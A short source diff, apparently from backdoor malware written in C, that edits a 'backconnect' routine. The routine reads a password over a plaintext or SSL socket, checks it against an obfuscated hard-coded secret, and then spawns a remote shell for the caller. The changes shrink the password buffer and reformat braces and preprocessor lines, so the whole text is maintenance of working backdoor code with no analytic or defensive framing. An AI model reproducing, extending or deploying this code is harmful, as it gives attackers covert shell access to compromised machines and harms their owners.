@@ -28,7 +28,7 @@ void ptext_spawn_shell(int sockfd){
 }
 
 void backconnect(int method, int sockfd){
-    char tmp[256];
+    char tmp[64];
     int got_pw;
 
     if(method == METHOD_PLAINTEXT){
@@ -45,8 +45,7 @@ void backconnect(int method, int sockfd){
         got_pw = !xstrncmp(BD_PWD, tmp);
 #endif
 
-        if(got_pw)
-        {
+        if(got_pw){
             memset(tmp, 0, strlen(tmp));
             ptext_spawn_shell(sockfd);
         }
@@ -63,13 +62,13 @@ void backconnect(int method, int sockfd){
             SSL_read(ssl, tmp, sizeof(tmp) - 1);
             tmp[strlen(tmp) - 1] = '\0';
 
-            #ifdef USE_CRYPT
+#ifdef USE_CRYPT
             xor(bd_pwd, BD_PWD);
             got_pw = !strcmp(crypt(tmp, bd_pwd), bd_pwd);
             clean(bd_pwd);
-            #else
+#else
             got_pw = !xstrncmp(BD_PWD, tmp);
-            #endif
+#endif
 
             if(got_pw){
                 memset(tmp, 0, strlen(tmp));
